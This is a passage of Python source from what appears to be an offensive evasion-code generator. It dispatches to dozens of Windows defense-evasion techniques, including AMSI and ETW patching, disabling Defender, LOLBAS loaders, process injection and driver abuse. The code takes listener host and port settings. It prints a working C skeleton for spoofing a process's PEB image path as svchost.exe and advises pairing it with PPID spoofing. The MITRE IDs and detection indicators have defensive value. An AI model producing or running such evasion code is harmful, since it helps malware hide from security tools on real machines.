        techniques=["T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking",
                    "T1574.002 - Hijack Execution Flow: DLL Side-Loading"],
        risk="HIGH",
        detections=[
            "File creation of <app>.exe.local beside a signed executable",
            "DLL loaded from application directory matching a System32 DLL name",
            "Sysmon Event 7: DLL image path in %APPDATA% or user-writable path",
            "SxS activation context resolving to non-WinSxS cache path",
        ],
    )


def _peb_imagepath_spoof(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// PEB ImagePathName spoofing — rewrite the process's own PEB to disguise\n"
        "// its image path. EDR tools that enumerate processes via PEB (e.g.,\n"
        "// Process Hacker, some AV products) see the spoofed name.\n"
        "//\n"
        "// The PEB (Process Environment Block) is readable/writable from user-mode.\n"
        "// Fields of interest:\n"
        "//   PEB.ImageBaseAddress          — pointer to the loaded PE (don't change)\n"
        "//   PEB.ProcessParameters->ImagePathName  — UNICODE_STRING, operator target\n"
        "//   PEB.ProcessParameters->CommandLine     — optional, also spoofable\n"
        "//\n"
        "// C skeleton:\n"
        "//   #include <windows.h>\n"
        "//   #include <winternl.h>\n"
        "//\n"
        "//   PPEB peb = (PPEB)__readgsqword(0x60);  // x64: GS:[0x60]\n"
        "//   PRTL_USER_PROCESS_PARAMETERS pp = peb->ProcessParameters;\n"
        "//\n"
        "//   // Spoof ImagePathName to look like svchost.exe:\n"
        "//   WCHAR fake[] = L\"C:\\\\Windows\\\\System32\\\\svchost.exe\";\n"
        "//   UNICODE_STRING us;\n"
        "//   us.Buffer = fake;\n"
        "//   us.Length = (USHORT)(wcslen(fake) * 2);\n"
        "//   us.MaximumLength = us.Length + 2;\n"
        "//   pp->ImagePathName = us;\n"
        "//\n"
        "//   // Optional: also spoof CommandLine:\n"
        "//   WCHAR fakeCmd[] = L\"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs\";\n"
        "//   pp->CommandLine.Buffer = fakeCmd;\n"
        "//   pp->CommandLine.Length = (USHORT)(wcslen(fakeCmd) * 2);\n"
        "//\n"
        "// Effect:\n"
        "//   - NtQueryInformationProcess(ProcessBasicInformation) returns the spoofed\n"
        "//     image path — used by Process Monitor, Process Hacker, many EDRs.\n"
        "//   - GetModuleFileNameEx() and ReadProcessMemory of PEB will return spoof.\n"
        "//   - Does NOT affect kernel-side image name (stored in EPROCESS.ImageFileName\n"
        "//     and SeAuditProcessCreationInfo) — kernel-level tools see the real path.\n"
    )
    return EvasionResult(
        command=src,
        technique="peb_imagepath_spoof",
        notes=(
            "PEB ImagePathName spoofing rewrites the process's self-reported image "
            "path in user-mode memory. Tools that enumerate processes via PEB "
            "(Process Hacker, some AV agents) are deceived. The kernel-side "
            "EPROCESS.ImageFileName is unchanged — EDRs with kernel drivers see "
            "through this. Combine with PPID spoofing for a convincing parent "
            "chain. Effective against userland-only process enumeration."
        ),
        techniques=["T1036.003 - Masquerading: Rename System Utilities",
                    "T1055.012 - Process Injection: Process Hollowing"],
        risk="HIGH",
        detections=[
            "NtQueryInformationProcess ImagePathName differs from kernel EPROCESS.ImageFileName",
            "Sysmon Event 1 commandline mismatch vs PEB QueryInformationProcess",
            "Memory scan: PEB->ProcessParameters->ImagePathName points outside module list",
            "ETW: NtCreateUserProcess image path vs subsequent PEB content mismatch",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

# Techniques that take (payload, obfuscate, lhost, lport).
_NETWORK_TECHNIQUES = {
    "lolbas_regsvr32", "lolbas_certutil", "lolbas_msbuild", "lolbas_installutil",
    "lolbas_cmstp", "lolbas_msxsl", "lolbas_wmic_xsl", "lolbas_syncappv",
    "lolbas_pubprn", "direct_syscalls", "indirect_syscalls",
    "process_hollowing", "module_stomping", "thread_hijack",
    "set_windows_hook_loader", "dll_sideload", "apc_injection", "early_bird_apc",
    "threadless_injection",
}

_DISPATCH = {
    # AMSI / ETW
    "amsi_reflection": _amsi_reflection,
    "amsi_patch_clr": _amsi_patch_clr,
    "amsi_hwbp": _amsi_hwbp,
    "amsi_provider_unregister": _amsi_provider_unregister,
    "amsi_wldp_downgrade": _amsi_wldp_downgrade,
    "etw_patch": _etw_patch,
    "etw_hwbp": _etw_hwbp,
    # CLM
    "clm_bypass_runspace": _clm_bypass_runspace,
    # Logging
    "scriptblock_logging_disable": _scriptblock_logging_disable,
    # Defender
    "defender_add_exclusion": _defender_add_exclusion,
    "defender_disable": _defender_disable,
    # Obfuscation
    "obfuscate_base64": _obfuscate_base64,
    # LOLBAS
    "lolbas_mshta": _lolbas_mshta,
    "lolbas_regsvr32": _lolbas_regsvr32,
    "lolbas_certutil": _lolbas_certutil,
    "lolbas_msbuild": _lolbas_msbuild,
    "lolbas_installutil": _lolbas_installutil,
    "lolbas_cmstp": _lolbas_cmstp,
    "lolbas_msxsl": _lolbas_msxsl,
    "lolbas_wmic_xsl": _lolbas_wmic_xsl,
    "lolbas_syncappv": _lolbas_syncappv,
    "lolbas_pubprn": _lolbas_pubprn,
    # PS downgrade
    "powershell_downgrade": _powershell_downgrade,
    # Syscalls / unhook
    "direct_syscalls": _direct_syscalls,
    "indirect_syscalls": _indirect_syscalls,
    "ntdll_unhook": _ntdll_unhook,
    # Sleep
    "sleep_obfuscation_ekko": _sleep_obfuscation_ekko,
    # Process tradecraft
    "ppid_spoof": _ppid_spoof,
    "process_hollowing": _process_hollowing,
    "module_stomping": _module_stomping,
    "thread_hijack": _thread_hijack,
    # Elite (v4.3)
    "rop_sleep": _rop_sleep,
    "set_windows_hook_loader": _set_windows_hook_loader,
    "com_rot_injection": _com_rot_injection,
    "environment_keying": _environment_keying,
    "in_memory_pe_loader": _in_memory_pe_loader,
    "dll_sideload": _dll_sideload,
    "apc_injection": _apc_injection,
    "early_bird_apc": _early_bird_apc,
    "heaven_gate": _heaven_gate,
    "process_ghosting": _process_ghosting,
    "process_doppelganging": _process_doppelganging,
    "process_herpaderping": _process_herpaderping,
    # Frontier (v4.4)
    "peb_unlink": _peb_unlink,
    "phantom_dll_hollow": _phantom_dll_hollow,
    "threadless_injection": _threadless_injection,
    "stack_spoof": _stack_spoof,
    "manual_map_header_erase": _manual_map_header_erase,
    "function_level_encryption": _function_level_encryption,
    # Advanced tradecraft (v4.5)
    "call_stack_desync": _call_stack_desync,
    "byovd": _byovd,
    "dll_redirection": _dll_redirection,
    "peb_imagepath_spoof": _peb_imagepath_spoof,
}


# Backfill MITRE metadata for the legacy evasion techniques that pre-date the
# uniform-metadata refactor. Newer techniques set their own values; values here
# only apply when the dispatched function returned an empty list.
_LEGACY_MITRE = {
    "amsi_patch_clr": ("T1562.001", "CRITICAL", [
        "amsi.dll .text section content drift from disk hash",
        "Add-Type compilation in a process with no benign use case",
        "VirtualProtect call sequence flipping amsi.dll to RWX",
    ]),
    "etw_patch": ("T1562.006", "HIGH", [
        "EtwEventWrite first byte modified to 0xC3 (memory scan)",
        "VirtualProtect on ntdll!EtwEventWrite",
        "Sudden ETW provider silence per-process",
    ]),
    "clm_bypass_runspace": ("T1059.001", "HIGH", [
        "Add-Type emitting C# that creates FullLanguage runspace",
        "PowerShell child runspace with non-default LanguageMode",
        "Sysmon Event 4104 with InitialSessionState.CreateDefault2",
    ]),
    "scriptblock_logging_disable": ("T1562.002", "HIGH", [
        "Event 4657 on ScriptBlockLogging / Transcription policy keys",
        "EnableScriptBlockLogging value set to 0",
    ]),
    "defender_add_exclusion": ("T1562.001", "HIGH", [
        "Add-MpPreference -ExclusionPath in ScriptBlock log",
        "Defender event 5007 (real-time config changed)",
        "Tamper Protection event log entries",
    ]),
    "defender_disable": ("T1562.001", "CRITICAL", [
        "Set-MpPreference -DisableRealtimeMonitoring \"true\" (high-fidelity)",
        "Defender event 5001 (real-time protection disabled)",
        "Microsoft-Windows-Windows Defender/Operational alert",
    ]),
    "obfuscate_base64": ("T1027", "MEDIUM", [
        "PowerShell -EncodedCommand argument in process command line",
        "Long base64 string in PS log (Event 4104)",
        "AMSI scanning the decoded inner command",
    ]),
    "lolbas_mshta": ("T1218.005", "HIGH", [
        "mshta.exe with javascript:/vbscript: URI (Sysmon Event 1)",
        "mshta.exe spawning powershell.exe / cmd.exe",
        "Defender ASR rule 'Block executable use of mshta'",
    ]),
}


def generate_evasion(
    technique: str,
    payload: str = "powershell.exe",
    obfuscate: bool = True,
    lhost: str = "192.168.1.100",
    lport: int = 8080,
) -> EvasionResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    fn = _DISPATCH[technique]
    if technique in _NETWORK_TECHNIQUES:
        result = fn(payload, obfuscate, lhost, lport)
    else:
        result = fn(payload, obfuscate)
    # Backfill MITRE if the function didn't set any (legacy techniques).
    if not result.techniques and technique in _LEGACY_MITRE:
        tid, risk, detections = _LEGACY_MITRE[technique]
        result.techniques = [tid]
        result.risk = risk
        result.detections = detections
    return result
